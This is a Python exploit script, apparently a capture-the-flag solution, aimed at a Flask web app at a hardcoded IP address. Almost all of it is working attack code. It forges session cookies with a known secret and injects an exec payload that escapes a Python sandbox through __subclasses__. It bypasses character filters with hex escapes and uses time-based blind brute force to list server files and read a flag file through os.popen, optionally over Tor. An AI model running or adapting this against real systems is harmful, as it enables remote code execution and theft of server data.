#!/bin/python3
# v30
# ┌──(web㉿unk9vvn)-[~]
# └─$ sudo service tor start;pip3 install flask_unsign flask
# ┌──(web㉿unk9vvn)-[~]
# └─$ sudo chmod +x exploit.py;sudo ./exploit.py
import os
import sys
import requests
import flask_unsign
import string




SECRET = 'tlci0GhK8n5A18K1GTx6KPwfYjuuftWw'
SERVER = 'http://206.189.18.188:30578'
USE_TOR = False
VERBOSE = False
BRUTE_VERBOSE = True
STIME = 3 # sleep time



def payload(pay):
    """
    add common parts of payload to the simple input `pay` and bypass filters of the backend.
    :pay: input payload
    :return: ready to use payload
    """

    # prepare the variable `i` in the payload to be used as `import` function
    # and add `pay` at the end
    pay = '''1
exec """i={}.__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']
%s"""''' % pay

    # bypass filters of the server on [,(,_,.
    filtered = ['[', '(', '_', '.']
    for i in filtered:
        pay = pay.replace(i, '\\x' + hex(ord(i))[2:])
    
    # check if length is more than 300, which server filtered that too
    l = len(pay)
    if l > 300:
        print(f"[X] payload length is {l}")

    return pay


def exploit(pay):
    """
    get the payload ready and send it to the server and return the response time.
    :pay: input payload
    :return: response time
    """

    # prepare payload
    pay = payload(pay)

    # set tor proxies
    session = requests.session()
    if USE_TOR:
        session.proxies = {'http':  'socks5://127.0.0.1:9050', 'https': 'socks5://127.0.0.1:9050'}

    # get signed session cookie
    session_cookie = flask_unsign.sign({'ingredient': 'i', 'measurements': pay}, SECRET)

    if VERBOSE:
        print("[!] Session: " + session_cookie)
        print("[!] Send Request")

    # send request and get the response and claculate time
    res = session.get(SERVER, cookies={'session': session_cookie})
    res_time = res.elapsed 

    if VERBOSE:
        print(f"[+] Response Received in {res_time}")
        print(res.text)

    return res_time


def time_exploit(pay):
    """
    use exploit function and just check the time of reponse. if the time is more than `STIME`, it means sleep is executed on the backend.
    :pay: input payload
    :return: True if sleep is executed otherwise return False.
    """

    res_time = exploit(pay)
    sec = res_time.total_seconds()
    had_sleep = sec > STIME
    return had_sleep


def bruteforce_exploit(pay, values):
    """
    do bruteforce attack using time_exploit function.
    :pay: input payload which contains '%BRUTE' string
    :values: list of values that should be tested, one by one, in the position of '%BRUTE' in `pay` argument
    :return: the value that caused an sleep on the backend
    """

    for i in values:
        pay_i = pay.replace('%BRUTE', str(i), 1)
        if time_exploit(pay_i):
            return i
        elif BRUTE_VERBOSE:
            print(f'[-] Not {i}')
    
    print(f'[X] Couldn\'t find any condidate using bruteforce among {values}')
    exit()



def main(argv):
    #
    # variables
    # default values are set after doing the corresponding phase
    #
    ls_len = 3 # number of files
    ls = ['app.py', 'templates', 'totally_not_a_loooooooong_flaaaaag']
    flag_len = 51
    flag = ''


    #
    # Phase1: test sleep
    #
    print(f'--> [#] Phase 1 started: test sleep')
    time_exploit(f"i('time').sleep({STIME})")
    print(f'--> [#] Phase 1 finished: test sleep')
    


    #
    # Phase2: how many files
    #
    print(f'--> [#] Phase 2 started: how many files')
    ls_len = bruteforce_exploit(f"if i('os').listdir('.').__len__() == %BRUTE: i('time').sleep({STIME})", range(10))
    print(f'[+] There are {ls_len} files')
    print(f'--> [#] Phase 2 finished: how many files')
        
    
    
    #
    # Phase3: length of file names
    #
    print(f'--> [#] Phase 3 started: length of file names')
    for i in range(ls_len):
        print(f'[!] trying to find length of file {i} name')
        name_len = bruteforce_exploit(f"if i('os').listdir('.')[{i}].__len__() == %BRUTE: i('time').sleep({STIME})", range(200))
        print(f'[+] name_len is {name_len} for file {i}')
        ls[i] = name_len * '?' # fill all characters with ?
    print(f'--> [#] Phase 3 finished: length of file names')



    #
    # Phase4: file names
    #
    print(f'--> [#] Phase 4 started: file names')
    for i in range(ls_len):
        file_name = ls[i]
        for j in range(len(file_name)):
            if file_name[j] != '?': # if the character is known (not `?`) continue next character
                continue
            chars = string.ascii_lowercase + '.-_' + string.ascii_uppercase + string.digits
            print(f'[!] trying to find character {j} of file {i} name')
            result = bruteforce_exploit(f"if i('os').listdir('.')[{i}][{j}] == '%BRUTE': i('time').sleep({STIME})", chars)

            file_name = file_name[:j] + result + file_name[j + 1:] # update found character
            ls[i] = file_name
            print(f'[+] file {i} name so far = "{file_name}"')
    print(f'--> [#] Phase 4 finished: file names')


    #
    # Phase5: content of flag file
    #
    print(f'--> [#] Phase 5 started: content of flag file')

    # get flag length
    print(f'[!] trying to find flag len')
    flag_len = bruteforce_exploit(f"if i('os').popen('ls|grep f|xargs stat -c%s').read()[:-1]=='%BRUTE':i('time').sleep({STIME})", range(4, 200))
    print(f'[+] flag len is {flag_len}')

    # get the flag
    for i in range(len(flag), flag_len):
        char = bruteforce_exploit(f"if i('os').popen('ls|grep f|xargs cat').read()[{i}]=='%BRUTE':i('time').sleep({STIME})", string.printable)
        
        flag += char
        print(f'[+] flag so far = "{flag}"')

    print(f'--> [#] Phase 5 finished: content of flag file')
    
    
    
if __name__ == "__main__":
    main(sys.argv)
